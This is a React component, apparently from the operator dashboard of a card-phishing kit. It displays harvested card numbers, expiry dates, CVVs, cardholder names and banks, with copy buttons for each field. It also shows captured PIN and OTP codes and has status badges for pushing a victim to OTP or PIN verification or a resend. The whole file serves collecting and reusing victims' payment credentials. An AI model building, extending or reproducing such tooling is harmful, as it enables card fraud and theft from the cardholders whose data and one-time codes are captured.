"use client"

import { ReactNode, useEffect, useRef, useState } from "react"
import { toast } from "sonner"

interface DataBubbleProps {
  title: string
  data: Record<string, any>
  timestamp?: string | Date
  status?: "pending" | "approved" | "rejected"
  showActions?: boolean
  isLatest?: boolean
  actions?: ReactNode
  icon?: string
  color?: "blue" | "green" | "purple" | "orange" | "pink" | "indigo" | "gray"
  layout?: "vertical" | "horizontal"
}

type CopyableCardField = "cardNumber" | "expiryDate" | "cvv"

const copyFieldLabels: Record<CopyableCardField, string> = {
  cardNumber: "رقم البطاقة",
  expiryDate: "تاريخ الانتهاء",
  cvv: "CVV"
}

const CARD_GRADIENTS: Record<string, string> = {
  blue:   "from-[#1a3a6e] via-[#1e4db7] to-[#163d9e]",
  green:  "from-[#0d4a33] via-[#1a6b4a] to-[#0a3d2a]",
  orange: "from-[#7c2d0e] via-[#c2440e] to-[#6b2509]",
  purple: "from-[#3b1270] via-[#6b21a8] to-[#2d0f5a]",
  pink:   "from-[#7c1042] via-[#be185d] to-[#6b0c38]",
  indigo: "from-[#1e1b5e] via-[#3730a3] to-[#171563]",
  gray:   "from-[#1f2937] via-[#374151] to-[#111827]",
}

export function DataBubble({
  title,
  data,
  timestamp,
  status,
  showActions,
  isLatest,
  actions,
  icon,
  color,
  layout = "vertical"
}: DataBubbleProps) {
  const [copiedField, setCopiedField] = useState<CopyableCardField | null>(null)
  const copyResetTimeoutRef = useRef<number | null>(null)

  useEffect(() => {
    return () => {
      if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current)
    }
  }, [])

  const isCopyableValue = (value: string) => {
    const t = value.trim()
    return !(!t || t.includes("•") || t.includes("*") || t === "غير محدد")
  }

  const copyWithFallback = async (value: string) => {
    const normalized = value.trim()
    if (!normalized || typeof window === "undefined") return false
    const fallback = () => {
      const el = document.createElement("textarea")
      el.value = normalized
      el.setAttribute("readonly", "")
      el.style.cssText = "position:fixed;top:-1000px;opacity:0"
      document.body.appendChild(el)
      el.focus()
      el.select()
      const ok = document.execCommand("copy")
      document.body.removeChild(el)
      return ok
    }
    if (navigator.clipboard && window.isSecureContext) {
      try { await navigator.clipboard.writeText(normalized); return true } catch { return fallback() }
    }
    return fallback()
  }

  const handleCopy = async (field: CopyableCardField, value: string) => {
    if (!isCopyableValue(value)) { toast.error("لا توجد قيمة قابلة للنسخ"); return }
    const ok = await copyWithFallback(value)
    if (!ok) { toast.error("تعذر نسخ القيمة"); return }
    setCopiedField(field)
    if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current)
    copyResetTimeoutRef.current = window.setTimeout(() => {
      setCopiedField(c => c === field ? null : c)
    }, 1500)
    toast.success(`تم نسخ ${copyFieldLabels[field]}`)
  }

  const getStatusBadge = () => {
    if (!status) return null
    const badges: Record<string, { text: string; className: string }> = {
      pending:           { text: "⏳ قيد المراجعة", className: "bg-yellow-50 text-yellow-700 border-yellow-200" },
      approved:          { text: "✓ تم القبول",     className: "bg-green-50 text-green-700 border-green-200" },
      rejected:          { text: "✗ تم الرفض",      className: "bg-red-50 text-red-600 border-red-200" },
      approved_with_otp: { text: "🔑 تحول OTP",     className: "bg-blue-50 text-blue-700 border-blue-200" },
      approved_with_pin: { text: "🔐 تحول PIN",     className: "bg-purple-50 text-purple-700 border-purple-200" },
      resend:            { text: "🔄 إعادة إرسال",  className: "bg-orange-50 text-orange-700 border-orange-200" },
      message:           { text: "📲 في انتظار الموافقة", className: "bg-amber-50 text-amber-700 border-amber-200 animate-pulse" },
    }
    const badge = badges[status]
    if (!badge) return null
    return (
      <span className={`inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold border ${badge.className}`}>
        {badge.text}
      </span>
    )
  }

  const formatTimestamp = (ts: string | Date) => {
    const d = new Date(ts)
    const mm = String(d.getMonth() + 1).padStart(2, "0")
    const dd = String(d.getDate()).padStart(2, "0")
    let h = d.getHours()
    const min = String(d.getMinutes()).padStart(2, "0")
    const ampm = h >= 12 ? "م" : "ص"
    h = h % 12 || 12
    return `${mm}-${dd} | ${h}:${min} ${ampm}`
  }

  const isCardData = title === "معلومات البطاقة" || !!data["رقم البطاقة"] || !!data["نوع البطاقة"]

  if (isCardData) {
    const rawNum     = (data["رقم البطاقة"] || "").toString().replace(/\s+/g, "")
    const cardNumber = rawNum ? (rawNum.match(/.{1,4}/g)?.join("  ") || rawNum) : "••••  ••••  ••••  ••••"
    const rawExpiry  = (data["تاريخ الانتهاء"] || "").toString().trim()
    const expiry     = rawExpiry || "••/••"
    const rawCvv     = (data["CVV"] || "").toString().trim()
    const cvv        = rawCvv || "•••"
    const holder     = data["اسم حامل البطاقة"] || "CARD HOLDER"
    const cardType   = (data["نوع البطاقة"] || "CARD").toString().toUpperCase()
    const cardLevel  = (data["مستوى البطاقة"] || "").toString().trim()
    const bankName   = data["البنك"] || ""
    const bankCountry = data["بلد البنك"] || ""

    const typeLower  = cardType.toLowerCase()
    let brand = "CARD"
    if (typeLower.includes("visa"))   brand = "VISA"
    else if (typeLower.includes("master")) brand = "MASTERCARD"
    else if (typeLower.includes("mada"))   brand = "MADA"
    else if (typeLower.includes("amex") || typeLower.includes("american")) brand = "AMEX"

    const grad = CARD_GRADIENTS[color || "green"]

    return (
      <div className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.07)] border border-gray-100" style={{ fontFamily: "Cairo, Tajawal, sans-serif" }}>

        {/* Bubble header */}
        <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-100">
          <div className="flex items-center gap-2">
            {isLatest && (
              <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">الأحدث</span>
            )}
            {timestamp && (
              <span className="text-[11px] text-gray-400">{formatTimestamp(timestamp)}</span>
            )}
          </div>
          <span className="text-sm font-bold text-gray-800">{title}</span>
        </div>

        <div className="p-4">
          {/* ─── Credit Card Visual ─── */}
          <div
            className={`relative bg-gradient-to-br ${grad} rounded-2xl text-white overflow-hidden`}
            style={{ aspectRatio: "1.78 / 1" }}
          >
            {/* Subtle pattern circles */}
            <div className="absolute -top-8 -right-8 w-44 h-44 rounded-full bg-white/5" />
            <div className="absolute -bottom-10 -left-10 w-40 h-40 rounded-full bg-white/5" />
            <div className="absolute inset-0 bg-gradient-to-tr from-black/20 to-white/10" />

            {/* Card inner content */}
            <div className="relative h-full flex flex-col px-5 py-4">

              {/* Top row: chip + NFC + brand */}
              <div className="flex items-center justify-between mb-auto">
                <div className="flex items-center gap-2.5">
                  <div className="w-9 h-7 rounded-md bg-gradient-to-br from-amber-300 to-yellow-500 shadow-md border border-amber-100/40" />
                  <svg width="18" height="18" viewBox="0 0 22 18" fill="none" opacity="0.7">
                    <path d="M2 9h4" stroke="white" strokeWidth="1.5" strokeLinecap="round"/>
                    <path d="M1 5.5c2.2 0 4 1.8 4 4S3.2 13.5 1 13.5" stroke="white" strokeWidth="1.5" strokeLinecap="round"/>
                    <path d="M1 2c4.1 0 7.5 3.4 7.5 7.5S5.1 17 1 17" stroke="white" strokeWidth="1.5" strokeLinecap="round"/>
                  </svg>
                </div>
                <span className="text-[11px] font-extrabold tracking-wider opacity-90 bg-white/15 px-2.5 py-1 rounded-full border border-white/20">
                  {brand}
                </span>
              </div>

              {/* Card Number — centred */}
              <div className="flex-1 flex items-center justify-center">
                <button
                  type="button"
                  onClick={() => void handleCopy("cardNumber", rawNum)}
                  disabled={!isCopyableValue(rawNum)}
                  title="نسخ رقم البطاقة"
                  className="group text-center"
                >
                  <div
                    className="font-mono font-bold tracking-[0.18em] drop-shadow-sm text-xl sm:text-2xl group-hover:opacity-80 transition-opacity"
                    style={{ direction: "ltr" }}
                  >
                    {cardNumber}
                  </div>
                  <div className="text-[10px] mt-1 opacity-0 group-hover:opacity-60 transition-opacity">
                    {copiedField === "cardNumber" ? "✓ تم النسخ" : "انقر للنسخ"}
                  </div>
                </button>
              </div>

              {/* Bottom row: holder / expiry / cvv */}
              <div className="flex items-end justify-between mt-auto pt-2">
                <div>
                  <div className="text-[10px] uppercase opacity-60 tracking-wide mb-0.5">حامل البطاقة</div>
                  <div className="text-sm font-semibold truncate max-w-[160px] uppercase">{holder}</div>
                </div>
                <div className="flex gap-4 text-center">
                  <button
                    type="button"
                    onClick={() => void handleCopy("expiryDate", rawExpiry)}
                    disabled={!isCopyableValue(rawExpiry)}
                    title="نسخ تاريخ الانتهاء"
                    className="group"
                  >
                    <div className="text-[10px] opacity-60 tracking-wide mb-0.5">الانتهاء</div>
                    <div className="font-bold text-xl group-hover:opacity-70 transition-opacity" style={{ direction: "ltr" }}>
                      {copiedField === "expiryDate" ? "✓" : expiry}
                    </div>
                  </button>
                  <button
                    type="button"
                    onClick={() => void handleCopy("cvv", rawCvv)}
                    disabled={!isCopyableValue(rawCvv)}
                    title="نسخ CVV"
                    className="group"
                  >
                    <div className="text-[10px] opacity-60 tracking-wide mb-0.5">CVV</div>
                    <div className="font-bold text-xl group-hover:opacity-70 transition-opacity" style={{ direction: "ltr" }}>
                      {copiedField === "cvv" ? "✓" : cvv}
                    </div>
                  </button>
                </div>
              </div>
            </div>
          </div>

          {/* ─── Tags below card ─── */}
          <div className="mt-3 flex flex-wrap gap-1.5">
            {bankName && bankName !== "غير محدد" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-blue-50 text-blue-700 border border-blue-100">{bankName}</span>
            )}
            {bankCountry && bankCountry !== "غير محدد" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-indigo-50 text-indigo-700 border border-indigo-100">{bankCountry}</span>
            )}
            {cardType && cardType !== "CARD" && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-gray-100 text-gray-700 border border-gray-200">{cardType}</span>
            )}
            {cardLevel && (
              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-amber-50 text-amber-700 border border-amber-100">{cardLevel}</span>
            )}
          </div>
        </div>

        {/* ─── Footer: status + actions ─── */}
        {(status || (showActions && actions)) && (
          <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
            <div>{getStatusBadge()}</div>
            {showActions && actions && <div>{actions}</div>}
          </div>
        )}
      </div>
    )
  }

  // ─────────────────────────────────────────
  // PIN / OTP digit boxes
  // ─────────────────────────────────────────
  const isPinOrOtp =
    title.includes("PIN") || title.includes("OTP") ||
    title.includes("رمز") || title.includes("كود") || title.includes("كلمة مرور")

  let digitValue = ""
  if (isPinOrOtp) {
    const entries = Object.entries(data)
    if (entries.length > 0) digitValue = entries[0][1]?.toString() || ""
  }

  return (
    <div
      className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.06)] border border-gray-100"
      style={{ fontFamily: "Cairo, Tajawal, sans-serif" }}
    >
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-100">
        <div className="flex items-center gap-2">
          {isLatest && (
            <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">الأحدث</span>
          )}
          {timestamp && (
            <span className="text-[11px] text-gray-400">{formatTimestamp(timestamp)}</span>
          )}
        </div>
        <div className="flex items-center gap-2">
          {icon && <span className="text-base">{icon}</span>}
          <span className="text-sm font-bold text-gray-800">{title}</span>
        </div>
      </div>

      {/* Body */}
      <div className="px-4 py-3">
        {isPinOrOtp && digitValue ? (
          <div className="flex justify-center gap-1.5 py-2" style={{ direction: "ltr" }}>
            {digitValue.split("").map((digit, i) => (
              <div
                key={i}
                className="w-9 h-11 rounded-lg bg-gray-50 border border-gray-200 shadow-sm flex items-center justify-center"
              >
                <span className="text-xl font-bold text-gray-900">{digit}</span>
              </div>
            ))}
          </div>
        ) : (
          <div className="divide-y divide-gray-50">
            {Object.entries(data).map(([key, value]) => {
              if (value === undefined || value === null) return null
              const str = value?.toString() || "-"
              return (
                <div key={key} className="flex items-start justify-between gap-4 py-2 text-sm">
                  <span className="text-gray-500 shrink-0 text-xs">{key}</span>
                  <span className="text-gray-900 font-semibold text-right break-all text-xs">{str}</span>
                </div>
              )
            })}
          </div>
        )}
      </div>

      {/* Footer */}
      {(status || (showActions && actions)) && (
        <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
          <div>{getStatusBadge()}</div>
          {showActions && actions && <div>{actions}</div>}
        </div>
      )}
    </div>
  )
}
